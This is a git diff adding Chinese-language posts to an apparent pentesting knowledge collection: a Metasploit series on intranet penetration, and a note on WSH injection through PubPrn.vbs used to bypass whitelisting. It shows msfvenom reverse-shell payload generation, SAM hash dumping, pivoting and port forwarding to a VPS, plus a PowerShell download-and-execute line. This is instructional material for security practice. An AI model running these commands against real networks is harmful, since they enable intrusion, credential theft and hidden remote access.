@@ -6,6 +6,7 @@
 - [MSF](#msf)
 - [Linux Shell](#linux-shell)
 - [PowerShell](#powershell)
+- [WSH Injection](#wsh-injection)
 - [Downloader](#downloader)
 - [Windows COM](#windows-com)
 - [Exchange](#exchange)
@@ -107,6 +108,187 @@ BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。
 
 
 ...
+
+---
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-07:
+
+MSF内网渗透系列-反弹shell
+
+渗透测试时，通过WEB漏洞，拿到了目标网络边缘服务器的webshell，或者通过社工钓鱼，控制了目标办公网络中的一台个人机。
+
+那么结下来就是利用MSF反弹回一个shell，开始在内网扩大我们的战果。
+
+接下来介绍几个基本概念：
+
+payload，又称为攻击载荷。想要返回一个shell，就要在目标机执行我们的payload
+
+正向shell (bind)，需要攻击机主动连接目标端口，如windows/shell/bind_tcp和windows/meterpreter/bind_tcp这两个payload，就会反弹一个正向的shell
+
+反向shell（reverse），目标机会反连接攻击机，如windows/shell/reverse_tcp和windows/meterpreter/reverse_tcp，就会反弹一个反向的shell
+
+meterpreter，Metasploit的一个payload，它具有强大的功能，其具备端口转发和socks代理功能简直就是内网渗透测试神器，windows/meterpreter/reverse_tcp和windows/meterpreter/bind_tcp就会反弹一个meterpreter的shell
+
+在Linux下，那么payload可以选择python/meterpreter/reverse_https
+
+以在window下反弹一个meterpreter的shell为例：
+
+首先利用msfvenom生成我们payload的执行程序：
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f exe > ./test.exe
+```
+
+在目标机192.168.31.196上执行test.exe，使用exploit/multi/handler模块监听，如图，可以看到返回了一个meterpreter的shell
+
+<img src="https://images.xiaomiquan.com/FvpV6xJty5T8eQVL5x3dvE2DOIXU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:YezmO3MN-DKsGVcqg5bgrhgPzCU=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+
+<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 在目标机上执行？你想执行就执行？
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 是的
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-15:
+
+MSF内网渗透系列-信息收集
+
+对内网进行渗透，首先我们要做好信息收集工作，摸清楚内网环境
+
+总体上来说，内网环境无非两种：域和工作组。当然就只针对域的渗透，我们都可以单独拿出来，做一系列的教程了。
+
+这里我们做无差别处理。下面进入本系列正题，利用MSF进行内网信息收集：
+
+__本地常规信息收集__
+
+Windows：
+[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows)
+
+
+
+Linux: 
+[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux)
+
+
+
+__本地HASH__
+
+meterpreter下利用hashdump从SAM导出密码哈希值
+
+__MSF端口扫描__
+
+利用search portscan查找相关模块。如：auxiliary/scanner/portscan/tcp,我们可以利用该模块扫描同段开3389的机器:
+
+`..msf>use auxiliary/scanner/portscan/tcp`   //选择模块
+
+`..msf>set PORTS 3389`                      //设置端口
+
+`..msf>set RHOSTS 192.168.0.1/24`            //扫描192.168.0.1/24网段内开放3389的主机
+
+__MSF服务扫描__
+
+SMB版本识别：auxiliary/scanner/smb/smb_version  来尝试识别windows的版本
+
+MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
+
+SSH版本信息：auxiliary/scanner/ssh/ssh_version
+
+FTP版本识别：auxiliary/scanner/ftp/ftp_version
+
+HTTP服务：auxiliary/scanner/http/http_header  我一般用来扫描内网中的WEB服务器，返回相关头信息
+
+图：利用auxiliary/scanner/ssh/ssh_version识别metaslpoitable的ssh版本信息：
+
+<img src="https://images.xiaomiquan.com/FhNBOpcgNqENAJ_T4XpzZc9iDlgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:--muZSfblaIxpdGW_mVD_44gmZs=" width="50%" height="50%" align="middle"/>
+
+
+---
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-23:
+
+MSF内网渗透系列——穿越边界
+
+前篇系列文章发出以后，很多新接触MSF小伙伴会有疑问:MSF做内网渗透总不能在内网找个机器安装一个MSF吧，这当然是可以的。还有小伙伴想到可以利用proxychain把MSF代理到目标内网，这也没毛病。
+
+下面我就介绍几个MSF自身穿越边界的姿势。
+
+假设我们在VPS上搭建了MSF，已经在目标内网中反弹回了一个meterpreter。那么我们就可以利用这个shell建立一条内网访问通道
+
+情景一：利用MSF扫描目标内网smb_version
+
+pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到目标内网环境
+
+sessions一下看看我们shell的信息：如下
+
+```。。
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > sessions
+。
+。Active sessions
+。===============
+。
+。  Id  Type                      Information  Connection
+。  --  ----                      -----------  ----------
+。  1   meterpreter python/linux  user @ test  8.8.8.8:443 -> 101.101.101.101:35272 (10.10.10.10)
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+我们发现session的ID为1，内网ip为10.10.10.10
+
+那么就可以在metasploit添加一个路由表，目的是访问10.10.10.11将通过meterpreter的session 1 来访问，如下：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > route add 10.10.10.11 255.255.255.255 1  //route add  目标i或ip段  掩码  session的ID
+。
+。[*] Route added
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+然后我们就可以：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > use auxiliary/scanner/smb/smb_version
+。
+。msf auxiliary(smb_version) > set rhosts 10.10.10.11  //如果想扫面整个C段 set rhosts 10.10.10.11/24
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+如果我们想让其他一些工具（如：Nmap）利用该路由表到目标内网搞事情呢？
+
+这里MSF的socks4a模块就可以提供一个监听隧道供其他应用程序访问：auxiliary/server/socks4a
+
+情景二：访问目标内网一个服务器（10.10.10.12）80端口的web应用
+
+我们可以利用meterpreter的portfwd把内网web服务器的80端口转发到我们VPS(8.8.8.8)的8088端口。然后我们就可以通过
+[http://8.8.8.8:8088/](http://8.8.8.8:8088/)
+
+访问
+[http://10.10.10.12:80](http://10.10.10.12:80)
+
+
+
+首先session -i 1进入meterpreter，然后做端口转发，如下：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf auxiliary(smb_version) > sessions -i 1
+。[*] Starting interaction with 1...
+。
+。meterpreter > portfwd add -l 8088 -r 192.168.31.169 -p 80
+。[*] Local TCP relay created: :8088 <-> 192.168.31.169:80
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+后记：在整理这篇文章的时候，就想着出个番外篇，专门整理一下其他穿越边界的各种姿势
+
 
 ---
 
@@ -483,6 +665,44 @@ C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString(
 
 ---
 
+
+## WSH Injection
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:
+
+
+__#姿势#__
+
+WSH 注入的一个实例：
+
+[WSH Injection: A Case Study – Posts By SpecterOps Team Members](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)
+
+
+
+这个之前我在本圈子里分享过（白名单 PubPrn.vbs 下载恶意执行），不过估计大多数人都不知道为什么，怎么用。
+
+想知道“为什么”可以看这个实例解析。
+
+至于怎么用，当你需要下载恶意代码动态执行时，PubPrn.vbs 的这个注入机制很棒。
+
+<img src="https://images.xiaomiquan.com/FtKzsYYbF40V-9QvwxD8K6lzsd1j?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:f5zadn-LBMOuhri-YTWEFKMS1G4=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 很强大，文中提到的《Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)》涉及的技巧也很溜，想看中文的旁友可以参考这个： 
+
+
+[http://www.evil0x.com/posts/21268.html](http://www.evil0x.com/posts/21268.html)
+
+
+...
+
+---
+
+
+
 ## downloader
 
 
@@ -677,3 +897,5 @@ __#姿势#__
 
 
 ---
+
+
